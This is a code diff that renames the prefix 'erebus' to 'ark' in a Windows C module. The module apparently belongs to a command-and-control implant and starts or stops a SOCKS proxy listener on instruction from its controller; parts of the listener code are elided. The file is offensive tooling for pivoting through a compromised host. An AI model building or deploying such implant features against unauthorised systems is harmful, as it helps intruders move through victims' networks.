@@ -5,8 +5,8 @@
 #include <stdlib.h>
 #include <string.h>
 
-#include "erebus/pb_c2.h"
-#include "erebus/pb_wire.h"
+#include "ark/pb_c2.h"
+#include "ark/pb_wire.h"
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -27,25 +27,25 @@ static DWORD WINAPI socks_accept_loop(LPVOID param) {
     return 0;
 }
 
-int erebus_task_socks_start(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
+int ark_task_socks_start(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
     uint32_t port = 1080;
     if (data_len > 0) {
-        erebus_pb_reader r;
-        erebus_pb_reader_init(&r, data, data_len);
+        ark_pb_reader r;
+        ark_pb_reader_init(&r, data, data_len);
         uint32_t field;
         uint8_t wire;
-        while (erebus_pb_reader_next(&r, &field, &wire)) {
+        while (ark_pb_reader_next(&r, &field, &wire)) {
             if (field == 1 && wire == 0) {
                 uint64_t v;
-                if (erebus_pb_read_varint(&r, &v)) port = (uint32_t)v;
+                if (ark_pb_read_varint(&r, &v)) port = (uint32_t)v;
             } else {
-                erebus_pb_skip(&r, wire);
+                ark_pb_skip(&r, wire);
             }
         }
     }
 
     if (g_socks_running)
-        return erebus_pb_encode_socks_start_result(1, port, out, out_len);
+        return ark_pb_encode_socks_start_result(1, port, out, out_len);
 
     WSADATA wsa;
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 0;
@@ -71,10 +71,10 @@ int erebus_task_socks_start(const uint8_t *data, size_t data_len, uint8_t **out,
     HANDLE th = CreateThread(NULL, 0, socks_accept_loop, (LPVOID)(ULONG_PTR)ln, 0, NULL);
     if (!th) { closesocket(ln); g_socks_listen = INVALID_SOCKET; g_socks_running = 0; return 0; }
     CloseHandle(th);
-    return erebus_pb_encode_socks_start_result(1, port, out, out_len);
+    return ark_pb_encode_socks_start_result(1, port, out, out_len);
 }
 
-int erebus_task_socks_stop(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
+int ark_task_socks_stop(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
     (void)data; (void)data_len;
     if (g_socks_running) {
         g_socks_running = 0;
@@ -83,5 +83,5 @@ int erebus_task_socks_stop(const uint8_t *data, size_t data_len, uint8_t **out, 
             g_socks_listen = INVALID_SOCKET;
         }
     }
-    return erebus_pb_encode_socks_stop_result(1, out, out_len);
+    return ark_pb_encode_socks_stop_result(1, out, out_len);
 }
